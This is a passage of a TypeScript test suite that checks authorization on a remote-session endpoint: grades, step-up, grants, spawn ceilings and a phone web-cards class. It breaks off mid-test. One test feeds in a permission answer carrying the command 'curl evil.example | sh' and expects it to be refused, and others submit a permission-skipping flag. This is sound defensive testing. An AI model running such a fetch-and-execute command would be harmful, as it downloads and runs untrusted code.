// Authorization at the endpoint (O10 M5; RL §5.5, §5.6, §5.10, §6.3; acceptance 8 and acceptance 4's ceiling and
// checkout cases). Every request reaches its route through a real RL2 channel to a started, enrolled endpoint (its direct
// listener on a fake tailnet table, listened on at loopback), and is decided by `authorize` before anything runs. The
// executors M7 and M8 build are stood in for by echoes that say what was authorized. The fake services answer the reads
// authorization makes (`session.status` for a lane B session's engine id, `session.pendingRequest` for the kind of a
// pending request, and `session.queue.list`); the sources M6 fills from RL10 are fakes.
//
// The org: A, an admin who owns the machine (devices a1 and a2); B, a member (b1, a Mac, and bw, the phone's web-cards
// device with a passkey); C, a member (c1). Sessions on the machine, lane B by appSessionId → engine id → record and
// lane A by engine id → record, each with the ownership and access its tests need.
import type { Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { base64urlEncode, generateSigningKey, keyId, memoryOrgView, NO_CERTIFICATES, signRecord, SIGNING_DOMAINS, type Action, type Channel, type ChannelMessage, type Grant, type OrgState, type SignedOrgState, type SigningKey } from 'org-protocol';
import * as z from 'zod';
import { afterEach, beforeAll, describe, expect, it } from 'vitest';
import { SoftwareAuthenticator } from '../../apps/org-protocol/test-support/authenticator.ts';
import { TestDevice as Device } from '../../apps/org-protocol/test-support/test-device.ts';
import { gradeOf, type GradeSpec } from '@shared/ipc/grades';
import { REGISTRY, type WireRegistry } from '@shared/ipc/registry';
import type { IpcErrorCode } from '@shared/ipc/errors';
import type { HostResponse } from '@shared/ipc/host-protocol';
import { createEndpoint, type Endpoint } from '../../src/endpoint';
import { Authorizer, type AuthorizeContext } from '../../src/endpoint/authorize';
import { OFFERS, type Offers } from '../../src/endpoint/offers';
import { EndpointOrg } from '../../src/endpoint/org-sync';
import type { SessionRecord, SessionTarget } from '../../src/endpoint/sources';
import { EndpointState } from '../../src/endpoint/state/store';
import { dialDirect } from './carriers';
import { fakeServices, type FakeServices } from './fake-services';
import { endorsed, genesis, iso, memberId, newDevice, revokedDevice, successor, type TestDevice } from './org-fixtures';

const ORG = 'org-m5';
const TAILNET = '100.101.102.104';
const HUB = 'http://127.0.0.1:9';
const RP_ID = 'hub.example';
const CHECKOUT = '/work/repo';
const sleep = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));

const A = memberId();
const B = memberId();
const C = memberId();
let a1: TestDevice;
let a2: TestDevice;
let b1: TestDevice;
let bw: TestDevice;
let c1: TestDevice;
let passkey: SoftwareAuthenticator;
let recovery: SigningKey;

beforeAll(async () => {
  a1 = await newDevice('a1');
  a2 = await endorsed(ORG, A, await newDevice('a2'), a1);
  b1 = await newDevice('b1');
  const phone = await newDevice('bw', 'web-cards');
  const passkeyKey = await generateSigningKey();
  passkey = new SoftwareAuthenticator(passkeyKey, base64urlEncode(crypto.getRandomValues(new Uint8Array(16))), RP_ID);
  // A web-cards device holds no step-up key (RL §5.10); its passkey signs its answers.
  const card = { ...phone.device, passkey: passkey.passkey };
  delete card.stepUpPub;
  bw = await endorsed(ORG, B, { ...phone, device: card }, b1);
  c1 = await newDevice('c1');
  recovery = await generateSigningKey();
});

// ---- The machine's sessions, as the fake services and the fake sources hold them ------------------------------------

/** Lane B: appSessionId → the engine's session id (`session.status`). */
const ENGINE: Record<string, string> = {
  'app-own': 'eng-own',
  'app-shared': 'eng-shared',
  'app-orgview': 'eng-orgview',
  'app-private': 'eng-private',
  'app-b': 'eng-b',
  'app-norecord': 'eng-norecord',
};
const record = (lane: 'A' | 'B', session: string, fields: Omit<SessionRecord, 'lane' | 'session'>): SessionRecord => ({ lane, session, ...fields });
const RECORDS: SessionRecord[] = [
  record('B', 'eng-own', { owners: ['@machine'] }),
  record('B', 'eng-shared', { owners: [A], shares: [{ member: B, grade: 'converse' }] }),
  record('B', 'eng-orgview', { owners: [A], access: 'org-view' }),
  record('B', 'eng-private', { owners: [A], access: 'private' }),
  record('B', 'eng-b', { owners: [B] }),
  record('A', 'la-approve', { owners: [A], shares: [{ member: B, grade: 'approve' }], launch: 'L1' }),
  record('A', 'la-converse', { owners: [A], shares: [{ member: B, grade: 'converse' }], launch: 'L1' }),
  record('A', 'la-b', { owners: [B], launch: 'L1' }),
];
/** requestId → the kind of the event that opened it (`session.pendingRequest`). */
const PENDING: Record<string, string> = { 'rq-question': 'question.requested', 'rq-perm': 'permission.requested', 'rq-plan': 'plan.requested' };

const ok = (value: unknown): HostResponse => ({ t: 'res', id: '0', ok: true, value });
const refused = (code: IpcErrorCode): HostResponse => ({ t: 'res', id: '0', ok: false, error: { code, message: code } });

/** The engine host's answers to the reads authorization makes; anything else is refused, and counted. */
function engineHost(seen: string[]) {
  return async (owner: string, name: string, input: unknown): Promise<HostResponse> => {
    seen.push(name);
    const { appSessionId, requestId } = input as { appSessionId?: string; requestId?: string };
    if (owner !== 'engine-host') return refused('unknown_command');
    if (name === 'session.status') return appSessionId !== undefined && ENGINE[appSessionId] !== undefined ? ok({ appSessionId, engineSessionId: ENGINE[appSessionId], launchId: 'launch-1' }) : refused('internal');
    if (name === 'session.pendingRequest') {
      // As the engine host answers: a session it holds no stream for is an error; so is an outage.
      if (appSessionId === undefined || ENGINE[appSessionId] === undefined || requestId === 'rq-internal') return refused('internal');
      if (requestId === 'rq-outage') return refused('host_unavailable');
      return ok({ event: requestId !== undefined && PENDING[requestId] !== undefined ? { kind: PENDING[requestId], requestId } : null });
    }
    if (name === 'session.queue.list') return ok({ entries: [{ queueId: 'q1', appSessionId, content: '/clear', createdAt: iso(Date.now()), state: 'queued', messageUuid: null, submittedAt: null, uncertain: false, steer: false }], paused: true });
    return refused('unknown_command');
  };
}

// ---- A started, enrolled endpoint ---------------------------------------------------------------------------------

type Fixture = {
  endpoint: Endpoint;
  services: FakeServices;
  ref: string;
  key: SigningKey;
  chain: SignedOrgState[];
  reads: string[];
  port: () => number;
};
const started: Fixture[] = [];

afterEach(async () => {
  for (const f of started.splice(0)) {
    await f.endpoint.stop();
    f.services.cleanup();
  }
});

type Options = { offers?: Offers; gradeOf?(name: string): GradeSpec | undefined; registry?: WireRegistry; settingsMode?: string };

async function start(options: Options = {}): Promise<Fixture> {
  const services = fakeServices();
  const reads: string[] = [];
  services.dispatch = engineHost(reads);
  const ref = services.machine.ref;
  const key = await generateSigningKey(true);
  const kid = await keyId(key.pub);
  const s1 = await genesis(ORG, A, a1, recovery);
  const s2 = await successor(s1, [a1], (s) => {
    s.members[0].devices.push(a2.device);
    s.members.push({ id: B, email: 'b@example.com', role: 'member', devices: [b1.device, bw.device] });
    s.members.push({ id: C, email: 'c@example.com', role: 'member', devices: [c1.device] });
    s.machines.push({ name: 'mini', ref, pub: key.pub, owners: [A] });
    s.machineNames.push({ name: 'mini', ref });
  });
  const state = EndpointState.open(services.machine.stateDir);
  state.setMachineKey({ version: 1, keyId: kid, jwk: (await crypto.subtle.exportKey('jwk', key.privateKey)) as JsonWebKey, created: iso(Date.now()) });
  state.setLedger({ version: 1, heldKeys: [kid], grants: {}, highWater: {} });
  state.setEnrollment({ version: 1, state: 'org-listed', name: 'mini', ref, org: ORG, hub: HUB, enrollment: 'e'.repeat(32), credentials: { clientId: 'id', clientSecret: 'secret' }, at: iso(Date.now()) });
  state.setOrg({ version: 1, org: ORG, pinned: { roots: s1.state.root.keys, recoveryPub: recovery.pub }, head: null, chain: [], hashes: [], certificates: NO_CERTIFICATES, acceptedTransitions: [], highWater: 0 });
  await new EndpointOrg(state, { log: () => {} }).adopt([s1, s2], []);
  let port = 0;
  const listen = (server: Server) =>
    new Promise<number>((resolve, reject) => {
      server.once('error', reject);
      server.listen(0, '127.0.0.1', () => resolve((port = (server.address() as AddressInfo).port)));
    });
  const records = new Map(RECORDS.map((r) => [`${r.lane}:${r.session}`, r]));
  const endpoint = createEndpoint({
    sleep: (ms) => sleep(Math.min(ms, 50)),
    env: { MAWS_ENDPOINT_DIRECT: '1' },
    direct: { interfaces: () => ({ utun4: [{ address: TAILNET, family: 'IPv4', internal: false, netmask: '255.255.255.255', mac: '00:00:00:00:00:00', cidr: null }] }), listen },
    authorization: {
      records: { record: (t: SessionTarget) => records.get(`${t.lane}:${t.session}`) ?? null, onChange: () => () => {} },
      checkouts: { known: (path) => path === CHECKOUT },
      settingsMode: () => options.settingsMode ?? 'default',
      offers: options.offers,
      gradeOf: options.gradeOf,
      registry: options.registry,
    },
  });
  await endpoint.start(services);
  // M7 and M8 stand in: an authorized request is echoed back with what authorization resolved.
  endpoint.gate.setExecutors({
    call: (channel, m, decision) => void channel.send({ t: 'result', id: m.id, ok: true, output: { target: decision.target ?? null } }),
    act: (channel, m) => void channel.send({ t: 'ack', opId: m.action.opId, state: 'accepted' }),
    sub: (channel, m) => void channel.send({ t: 'subbed', sub: m.sub, mode: 'snapshot', epoch: 'e1', seq: 0 }),
  });
  const f: Fixture = { endpoint, services, ref, key, chain: [s1, s2], reads, port: () => port };
  started.push(f);
  for (let i = 0; port === 0; i++) {
    if (i > 200) throw new Error('the direct listener never bound');
    await sleep(10);
  }
  return f;
}

// ---- A device on a channel ------------------------------------------------------------------------------------------

type Remote = { device: Device; channel: Channel; inbox: ChannelMessage[] };

async function open(f: Fixture, who: TestDevice, member: string): Promise<Remote> {
  const clientClass = who.device.class;
  const device = new Device({
    identity: { org: ORG, member, device: who.device.id, clientClass, channelKey: who.channel, build: 'grades', capabilities: [] },
    org: memoryOrgView({ chain: [...f.chain] }),
    ...(clientClass === 'web-cards' ? { authenticator: passkey } : { stepUpKey: who.stepUp }),
  });
  const channel = await device.open(() => dialDirect(`ws://127.0.0.1:${f.port()}`), f.ref);
  const inbox: ChannelMessage[] = [];
  channel.onMessage((m) => void inbox.push(m));
  return { device, channel, inbox };
}

/** The first message from `from` on that `match` takes. */
async function answer(remote: Remote, from: number, match: (m: ChannelMessage) => boolean): Promise<ChannelMessage> {
  for (let i = 0; i < 600; i++) {
    const found = remote.inbox.slice(from).find(match);
    if (found !== undefined) return found;
    await sleep(5);
  }
  throw new Error('no answer within 3 s');
}

/** `ok` when the request was authorized, else the refusal's reason. */
async function call(remote: Remote, name: string, input?: unknown): Promise<string> {
  const id = crypto.randomUUID();
  const from = remote.inbox.length;
  await remote.channel.send({ t: 'call', id, name, input: input ?? null });
  const m = (await answer(remote, from, (x) => x.t === 'result' && x.id === id)) as unknown as { ok: boolean; error?: { code: string } };
  return m.ok ? 'ok' : m.error!.code;
}

async function send(remote: Remote, action: Action): Promise<string> {
  const from = remote.inbox.length;
  await remote.channel.send({ t: 'act', action });
  const m = (await answer(remote, from, (x) => x.t === 'ack' && x.opId === action.opId)) as unknown as { state: string; reason?: string };
  return m.state === 'accepted' ? 'ok' : m.reason!;
}

async function subscribe(remote: Remote, session: { lane: 'A' | 'B'; id: string }, view?: 'full' | 'cards'): Promise<string> {
  const sub = crypto.randomUUID();
  const from = remote.inbox.length;
  await remote.channel.send({ t: 'sub', sub, session, ...(view === undefined ? {} : { view }), cursor: null, credit: 65536 } as ChannelMessage);
  const m = (await answer(remote, from, (x) => (x.t === 'subbed' || x.t === 'ended') && x.sub === sub)) as { t: string; reason?: string };
  return m.t === 'subbed' ? 'ok' : m.reason!;
}

/** A lane B action on `appSessionId`: the command's input as `args`, the session and its context named. */
function laneB(f: Fixture, remote: Remote, name: string, appSessionId: string, args: Record<string, unknown> = {}): Action {
  return remote.device.action({ machine: f.ref, action: name, session: appSessionId, context: { lane: 'B', launchId: 'launch-1', engineSessionId: ENGINE[appSessionId] ?? 'none' }, args: { appSessionId, ...args } });
}

/** A lane A action (`sminos.<rpc>`) on the engine session `session`. */
function laneA(f: Fixture, remote: Remote, rpc: string, session: string, args: Record<string, unknown> = {}): Action {
  return remote.device.action({ machine: f.ref, action: `sminos.${rpc}`, session, context: { lane: 'A', session, launch: 'L1' }, args: { session, ...args } });
}

function spawn(f: Fixture, remote: Remote, args: Record<string, unknown> = {}): Action {
  return remote.device.action({ machine: f.ref, action: 'sminos.spawn', args: { checkout: CHECKOUT, brief: 'do the thing', ...args } });
}

const digest = (request: string) => ({ session: 'la-approve', request, tool: 'Bash', input_sha256: '0'.repeat(64) });

async function grant(f: Fixture, member: string, edit: Partial<Grant> = {}, by: TestDevice = a1): Promise<string> {
  const body: Grant = { org: ORG, machine: f.ref, machineKey: await keyId(f.key.pub), member, rights: ['spawn'], version: 1, issued: iso(Date.now()), ...edit };
  return (await f.endpoint.cli('grant', ['-'], JSON.stringify(await signRecord(SIGNING_DOMAINS.grant, body, by.stepUp.privateKey, by.stepUp.pub)))).out;
}

async function deliver(f: Fixture, edit: (s: OrgState) => void | Promise<void>): Promise<void> {
  const next = await successor(f.chain[f.chain.length - 1], [a1], edit);
  const out = await f.endpoint.cli('revoke', ['-'], JSON.stringify(next));
  expect(out.code, out.out).toBe(0);
  f.chain.push(next);
}

// ---- The tests ------------------------------------------------------------------------------------------------------

describe('only what is offered crosses', () => {
  it('refuses a name the offer table doesn’t hold, graded or not (`not-offered`)', async () => {
    const f = await start();
    const a = await open(f, a1, A);
    expect(await call(a, 'session.list', {})).toBe('not-offered');
    expect(await call(a, 'files.read', { appSessionId: 'app-own', path: 'README.md' })).toBe('not-offered');
    expect(await call(a, 'pty.attach', {})).toBe('not-offered');
    expect(await call(a, 'documents.open', {})).toBe('not-offered');
    expect(await send(a, laneB(f, a, 'session.launch', 'app-own'))).toBe('not-offered');
    expect(await send(a, laneA(f, a, 'resume', 'la-approve'))).toBe('not-offered');
    expect(await send(a, laneB(f, a, 'session.status', 'app-own'))).toBe('not-offered');
    // An offered action asked for as a call must be an act.
    expect(await call(a, 'session.send', { appSessionId: 'app-own', content: 'hi' })).toBe('act-required');
  });

  it('refuses an offered name its namespace declares no grade for (`ungraded`), until it declares one', async () => {
    const declared: { grade?: GradeSpec } = {};
    const registry: WireRegistry = { ...REGISTRY, commands: { ...REGISTRY.commands, 'fixture.read': { input: z.strictObject({ appSessionId: z.string() }), output: z.unknown(), owner: 'engine-host' } } };
    const offers: Offers = { ...OFFERS, commands: { ...OFFERS.commands, 'fixture.read': { kind: 'call', executor: 'engine-host', target: 'appSessionId' } } };
    const f = await start({ registry, offers, gradeOf: (name) => (name === 'fixture.read' ? declared.grade : gradeOf(name)) });
    const a = await open(f, a1, A);
    expect(await call(a, 'fixture.read', { appSessionId: 'app-own' })).toBe('ungraded');
    declared.grade = 'view';
    expect(await call(a, 'fixture.read', { appSessionId: 'app-own' })).toBe('ok');
  });

  it('refuses an input its command’s schema refuses (`malformed`) and a session-ranked request that names no session (`no-target`)', async () => {
    const f = await start();
    const a = await open(f, a1, A);
    expect(await call(a, 'session.status', { appSessionId: 'app-own', extra: 1 })).toBe('malformed');
    expect(await send(a, a.device.action({ machine: f.ref, action: 'sminos.steer', args: { text: 'hi' } }))).toBe('no-target');
    // The action's own session must be the one its input names.
    expect(await send(a, { ...laneB(f, a, 'session.interrupt', 'app-own', { cancelEngineQueued: false }), session: 'app-shared' })).toBe('malformed');
  });
});

describe('one command of each grade class, refused below its grade (acceptance 8, over a fixture table)', () => {
  const fixture: Offers = {
    ...OFFERS,
    commands: {
      ...OFFERS.commands,
      'files.read': { kind: 'call', executor: 'main', target: 'appSessionId' },
      'files.write': { kind: 'act', executor: 'main', target: 'appSessionId' },
      'pty.spawn': { kind: 'act', executor: 'pty-host', target: 'machine' },
      'settings.set': { kind: 'act', executor: 'main', target: 'machine' },
      'host.status': { kind: 'call', executor: 'main', target: 'machine' },
      'session.mcpAuthenticate': { kind: 'act', executor: 'engine-host', target: 'appSessionId' },
      'session.ui.press': { kind: 'act', executor: 'engine-host', target: 'appSessionId' },
    },
  };
  const ptySpawn = (f: Fixture, remote: Remote) => remote.device.action({ machine: f.ref, action: 'pty.spawn', args: { appSessionId: 'app-own', label: 't1', cwd: CHECKOUT, cols: 80, rows: 24 } });

  it('a `view` read on a session the member holds nothing on', async () => {
    const f = await start({ offers: fixture });
    const c = await open(f, c1, C);
    expect(await call(c, 'files.read', { appSessionId: 'app-private', path: 'README.md' })).toBe('grade');
    expect(await call(c, 'files.read', { appSessionId: 'app-orgview', path: 'README.md' })).toBe('ok');
    expect(await call(c, 'files.read', { appSessionId: 'app-norecord', path: 'README.md' })).toBe('grade');
    const a = await open(f, a1, A);
    expect(await call(a, 'files.read', { appSessionId: 'app-private', path: 'README.md' })).toBe('ok');
  });

  it('a `manage` write by a member who may only converse', async () => {
    const f = await start({ offers: fixture });
    const b = await open(f, b1, B);
    const write = (remote: Remote) => laneB(f, remote, 'files.write', 'app-shared', { path: 'a.txt', content: 'x', expectedHash: '0'.repeat(64) });
    expect(await send(b, write(b))).toBe('grade');
    const a = await open(f, a1, A);
    expect(await send(a, write(a))).toBe('ok');
  });

  it('`pty.spawn` without the shell right; an owner’s without step-up, a `shell` grant holder’s only with one', async () => {
    const f = await start({ offers: fixture });
    const b = await open(f, b1, B);
    expect(await send(b, ptySpawn(f, b))).toBe('grade');
    const a = await open(f, a1, A);
    expect(await send(a, ptySpawn(f, a))).toBe('ok');
    expect(await grant(f, B, { rights: ['shell'] })).toBe(`kept: version 1 for member ${B}, shell`);
    expect(await send(b, ptySpawn(f, b))).toBe('step-up');
    expect(await send(b, await b.device.stepUp(ptySpawn(f, b)))).toBe('ok');
  });

  it('a `machine-admin` command (a `settings.*` one), and an admin’s needs step-up', async () => {
    const f = await start({ offers: fixture });
    const b = await open(f, b1, B);
    const set = (remote: Remote) => remote.device.action({ machine: f.ref, action: 'settings.set', args: {} });
    expect(await send(b, set(b))).toBe('grade');
    const a = await open(f, a1, A);
    expect(await send(a, set(a))).toBe('step-up');
    expect(await send(a, await a.device.stepUp(set(a)))).toBe('ok');
  });

  it('the routing classes, refused from an owner too', async () => {
    const f = await start({ offers: fixture });
    const a = await open(f, a1, A);
    expect(await call(a, 'host.status')).toBe('grade');
    expect(await call(a, 'host.status', {})).toBe('grade');
    expect(await send(a, await a.device.stepUp(laneB(f, a, 'session.mcpAuthenticate', 'app-own', { serverName: 's', redirectUri: null })))).toBe('grade');
  });

  it('`no-rule` for a by-effect command nobody has read for remote use (`session.ui.press`)', async () => {
    const f = await start({ offers: fixture });
    const a = await open(f, a1, A);
    expect(await send(a, laneB(f, a, 'session.ui.press', 'app-own', { plugin: 'p', handle: 1 }))).toBe('no-rule');
  });
});

describe('by effect, through the channel', () => {
  it('grades words by their slash command', async () => {
    const f = await start();
    const b = await open(f, b1, B);
    expect(await send(b, laneB(f, b, 'session.send', 'app-shared', { content: 'please look at the tests' }))).toBe('ok');
    expect(await send(b, laneB(f, b, 'session.send', 'app-shared', { content: '/model claude-opus' }))).toBe('ok');
    expect(await send(b, laneB(f, b, 'session.send', 'app-shared', { content: '/clear' }))).toBe('grade');
    expect(await send(b, laneB(f, b, 'session.steer', 'app-shared', { content: '/compact' }))).toBe('grade');
    expect(await send(b, laneA(f, b, 'command', 'la-converse', { name: 'clear' }))).toBe('grade');
    expect(await send(b, laneA(f, b, 'command', 'la-converse', { name: 'model', args: 'opus' }))).toBe('ok');
    const a = await open(f, a1, A);
    expect(await send(a, laneB(f, a, 'session.send', 'app-shared', { content: '/clear' }))).toBe('ok');
  });

  it('grades an answer by the pending request: a question converse, a permission approve', async () => {
    const f = await start();
    const b = await open(f, b1, B);
    const question = { kind: 'question', answers: { 'Which one?': 'the first' } };
    const allow = { kind: 'permission', decision: 'allow', scope: 'once' };
    expect(await send(b, laneB(f, b, 'session.answer', 'app-shared', { requestId: 'rq-question', answer: question }))).toBe('ok');
    expect(await send(b, laneB(f, b, 'session.answer', 'app-shared', { requestId: 'rq-perm', answer: allow }))).toBe('grade');
    // Called a question, the pending permission still takes approve.
    expect(await send(b, laneB(f, b, 'session.answer', 'app-shared', { requestId: 'rq-perm', answer: question }))).toBe('grade');
    expect(f.reads).toContain('session.pendingRequest');
    const a = await open(f, a1, A);
    expect(await send(a, laneB(f, a, 'session.answer', 'app-shared', { requestId: 'rq-perm', answer: allow }))).toBe('ok');
  });

  it('reads nothing of a session the caller holds no rank on, so a refusal can’t tell a private session from none', async () => {
    const f = await start();
    const c = await open(f, c1, C);
    const question = { kind: 'question', answers: { 'Which one?': 'the first' } };
    expect(await send(c, laneB(f, c, 'session.answer', 'app-private', { requestId: 'rq-question', answer: question }))).toBe('grade');
    expect(await send(c, laneB(f, c, 'session.answer', 'app-ghost', { requestId: 'rq-question', answer: question }))).toBe('grade');
    expect(f.reads).not.toContain('session.pendingRequest');
    // A read that fails for its session is `grade`; only a host that can't answer now is `unavailable`.
    const a = await open(f, a1, A);
    expect(await send(a, laneB(f, a, 'session.answer', 'app-own', { requestId: 'rq-internal', answer: question }))).toBe('grade');
    expect(await send(a, laneB(f, a, 'session.answer', 'app-own', { requestId: 'rq-outage', answer: question }))).toBe('unavailable');
  });

  it('takes manage to unpause a queue (one holding `/clear` here) or promote an entry, converse to pause it', async () => {
    const f = await start();
    const b = await open(f, b1, B);
    expect(await send(b, laneB(f, b, 'session.queue.setPaused', 'app-shared', { paused: false }))).toBe('grade');
    expect(await send(b, laneB(f, b, 'session.queue.promote', 'app-shared', { queueId: 'q1' }))).toBe('grade');
    expect(await send(b, laneB(f, b, 'session.queue.setPaused', 'app-shared', { paused: true }))).toBe('ok');
    const a = await open(f, a1, A);
    expect(await send(a, laneB(f, a, 'session.queue.setPaused', 'app-shared', { paused: false }))).toBe('ok');
  });
});

describe('lane A’s actions and the machine’s reads', () => {
  it('grades the RPCs by §G’s table', async () => {
    const f = await start();
    const b = await open(f, b1, B);
    expect(await send(b, laneA(f, b, 'steer', 'la-converse', { text: 'go on' }))).toBe('ok');
    expect(await send(b, laneA(f, b, 'interrupt', 'la-converse'))).toBe('ok');
    expect(await send(b, laneA(f, b, 'decide', 'la-converse', { digest: digest('r1'), decision: 'allow' }))).toBe('grade');
    expect(await send(b, laneA(f, b, 'compact', 'la-approve'))).toBe('grade');
    expect(await send(b, laneA(f, b, 'steer', 'la-unknown', { text: 'go on' }))).toBe('grade');
    expect(await call(b, 'sminos.rows', { session: 'la-converse' })).toBe('ok');
    expect(await call(b, 'sminos.rows', { session: 'la-unknown' })).toBe('grade');
  });

  it('answers the listings call to every member, and serves session reads by rank', async () => {
    const f = await start();
    const c = await open(f, c1, C);
    expect(await call(c, 'endpoint.listings', {})).toBe('ok');
    expect(await call(c, 'session.status', { appSessionId: 'app-orgview' })).toBe('ok');
    expect(await call(c, 'session.status', { appSessionId: 'app-shared' })).toBe('grade');
  });
});

describe('subscriptions', () => {
  it('needs view for a full subscription and ownership for the cards view', async () => {
    const f = await start();
    const c = await open(f, c1, C);
    expect(await subscribe(c, { lane: 'B', id: 'app-private' })).toBe('grade');
    expect(await subscribe(c, { lane: 'B', id: 'app-orgview' })).toBe('ok');
    expect(await subscribe(c, { lane: 'B', id: 'app-orgview' }, 'cards')).toBe('grade');
    const a = await open(f, a1, A);
    expect(await subscribe(a, { lane: 'B', id: 'app-own' }, 'cards')).toBe('ok');
    expect(await subscribe(a, { lane: 'A', id: 'la-converse' }, 'full')).toBe('ok');
    const b = await open(f, b1, B);
    expect(await subscribe(b, { lane: 'A', id: 'la-converse' }, 'cards')).toBe('grade');
  });
});

describe('policy applies to effects, not envelopes', () => {
  it('read-only refuses a converse-graded act and serves a view call and a subscription', async () => {
    const f = await start();
    expect((await f.endpoint.cli('policy', ['--read-only', 'on'])).code).toBe(0);
    const a = await open(f, a1, A);
    expect(await send(a, laneB(f, a, 'session.send', 'app-own', { content: 'hi' }))).toBe('read-only');
    expect(await send(a, await a.device.stepUp(spawn(f, a)))).toBe('read-only');
    expect(await call(a, 'session.status', { appSessionId: 'app-own' })).toBe('ok');
    expect(await subscribe(a, { lane: 'B', id: 'app-own' })).toBe('ok');
  });

  it('bounds a spawn’s permission mode by the ceiling, its checkout by the known ones, and its args by the allow-list', async () => {
    const f = await start({ settingsMode: 'acceptEdits' });
    const a = await open(f, a1, A);
    const stepped = async (args: Record<string, unknown>) => send(a, await a.device.stepUp(spawn(f, a, args)));
    // The ceiling `settings` reads the machine's defaultMode (here acceptEdits).
    expect(await stepped({ permission_mode: 'acceptEdits' })).toBe('ok');
    expect(await stepped({ permission_mode: 'auto' })).toBe('ceiling');
    expect(await stepped({})).toBe('ok');
    expect((await f.endpoint.cli('policy', ['--ceiling', 'default'])).code).toBe(0);
    expect(await stepped({ permission_mode: 'bypassPermissions' })).toBe('ceiling');
    expect(await stepped({ permission_mode: 'plan' })).toBe('ok');
    expect(await stepped({ permission_mode: 'yolo' })).toBe('ceiling');
    expect(await stepped({ checkout: '/elsewhere' })).toBe('unknown-checkout');
    expect(await stepped({ env: { PATH: '/tmp' } })).toBe('spec-field');
    expect(await stepped({ flags: ['--dangerously-skip-permissions'] })).toBe('spec-field');
  });
});

describe('step-up', () => {
  it('is demanded for a spawn and accepted when it verifies', async () => {
    const f = await start();
    const a = await open(f, a1, A);
    expect(await send(a, spawn(f, a))).toBe('step-up');
    // A step-up by another device's key does not verify for this one.
    const forged = await new Device({ identity: { org: ORG, member: A, device: 'a1', clientClass: 'native-mac', channelKey: a1.channel, build: 'x', capabilities: [] }, org: memoryOrgView({ chain: f.chain }), stepUpKey: a2.stepUp }).stepUp(spawn(f, a));
    expect(await send(a, forged)).toBe('step-up');
    expect(await send(a, await a.device.stepUp(spawn(f, a)))).toBe('ok');
  });

  it('is demanded for an approval on a session the member doesn’t own, never for an owner’s own', async () => {
    const f = await start();
    const b = await open(f, b1, B);
    const decide = (remote: Remote) => laneA(f, remote, 'decide', 'la-approve', { digest: digest('r1'), decision: 'allow' });
    expect(await send(b, decide(b))).toBe('step-up');
    expect(await send(b, await b.device.stepUp(decide(b)))).toBe('ok');
    const a = await open(f, a1, A);
    expect(await send(a, decide(a))).toBe('ok');
  });
});

describe('grants (RL §6.3)', () => {
  it('raises a member to `spawn`; a lower version is ignored, one for a key the ledger doesn’t hold refused, and a revoked signer ends it', async () => {
    const f = await start();
    const b = await open(f, b1, B);
    const spawnB = async () => send(b, await b.device.stepUp(spawn(f, b)));
    expect(await spawnB()).toBe('grade');
    // Nor may one who can't spawn probe the machine's checkouts.
    expect(await send(b, await b.device.stepUp(spawn(f, b, { checkout: '/elsewhere' })))).toBe('grade');
    expect(await grant(f, B, { version: 2, rights: ['spawn'] }, a2)).toBe(`kept: version 2 for member ${B}, spawn`);
    expect(await spawnB()).toBe('ok');
    expect(await grant(f, B, { version: 1, rights: [] })).toBe('refused: not-newer');
    expect(await spawnB()).toBe('ok');
    const other = await keyId((await generateSigningKey()).pub);
    expect(await grant(f, B, { version: 3, rights: ['spawn', 'shell'], machineKey: other })).toBe('refused: not-listed');
    // The grant's signer, a2, is revoked: the grant ends, and the member holds none.
    await deliver(f, async (s) => {
      s.members[0].devices = s.members[0].devices.filter((d) => d.id !== 'a2');
      s.revoked.push(...(await revokedDevice(A, a2.device)));
    });
    expect(await spawnB()).toBe('grade');
  });
});

describe('the web-cards class (RL §5.10)', () => {
  const answerOn = (f: Fixture, remote: Remote, appSessionId: string, requestId: string, given: Record<string, unknown>) => laneB(f, remote, 'session.answer', appSessionId, { requestId, answer: given });
  const question = { kind: 'question', answers: { 'Which one?': 'the first' } };
  const allowOnce = { kind: 'permission', decision: 'allow', scope: 'once' };

  it('refuses a send, and accepts an owned session’s answer with a good assertion, then refuses its replayed counter', async () => {
    const f = await start();
    const phone = await open(f, bw, B);
    expect(await send(phone, await phone.device.webauthn(laneB(f, phone, 'session.send', 'app-b', { content: 'hi' }), HUB))).toBe('class');
    const answered = await phone.device.webauthn(answerOn(f, phone, 'app-b', 'rq-question', question), HUB);
    expect(await send(phone, answered)).toBe('ok');
    // The same action and assertion again: M7's nonce window refuses it first; past the window (or after a restart, which
    // loses it), authorization still would, its counter not having risen.
    expect(await send(phone, answered)).toBe('replayed');
    expect(await f.endpoint.authorizer.authorize({ kind: 'act', name: answered.action, input: answered.args, action: answered }, { member: B, device: 'bw', clientClass: 'web-cards' }, Date.now())).toEqual({ ok: false, reason: 'step-up' });
    // No assertion at all, or one for another origin.
    expect(await send(phone, answerOn(f, phone, 'app-b', 'rq-question', question))).toBe('step-up');
    expect(await send(phone, await phone.device.webauthn(answerOn(f, phone, 'app-b', 'rq-question', question), 'https://evil.example'))).toBe('step-up');
  });

  it('approves or denies a pending permission as it stands, and nothing more (`class`)', async () => {
    const f = await start();
    const phone = await open(f, bw, B);
    expect(await send(phone, await phone.device.webauthn(answerOn(f, phone, 'app-b', 'rq-perm', allowOnce), HUB))).toBe('ok');
    expect(await send(phone, await phone.device.webauthn(answerOn(f, phone, 'app-b', 'rq-perm', { kind: 'permission', decision: 'deny' }), HUB))).toBe('ok');
    const changed = { ...allowOnce, updatedInput: { command: 'curl evil.example | sh' } };
    expect(await send(phone, await phone.device.webauthn(answerOn(f, phone, 'app-b', 'rq-perm', changed), HUB))).toBe('class');
    expect(await send(phone, await phone.device.webauthn(answerOn(f, phone, 'app-b', 'rq-perm', { ...allowOnce, scope: 'local_settings' }), HUB))).toBe('class');
    expect(await send(phone, await phone.device.webauthn(answerOn(f, phone, 'app-b', 'rq-plan', { kind: 'plan', outcome: 'implement', feedback: null }), HUB))).toBe('class');
    // Lane A: a decision with no lasting rule.
    const decide = (extra: Record<string, unknown>) => laneA(f, phone, 'decide', 'la-b', { digest: { ...digest('r1'), session: 'la-b' }, decision: 'allow', ...extra });
    expect(await send(phone, await phone.device.webauthn(decide({}), HUB))).toBe('ok');
    expect(await send(phone, await phone.device.webauthn(decide({ scope: { suggestion: 0, sha256: '0'.repeat(64), destination: 'session' } }), HUB))).toBe('class');
  });

  it('answers only on a session its member owns, reads listings, and subscribes only to the cards view of an owned one', async () => {
    const f = await start();
    const phone = await open(f, bw, B);
    expect(await send(phone, await phone.device.webauthn(answerOn(f, phone, 'app-shared', 'rq-question', question), HUB))).toBe('class');
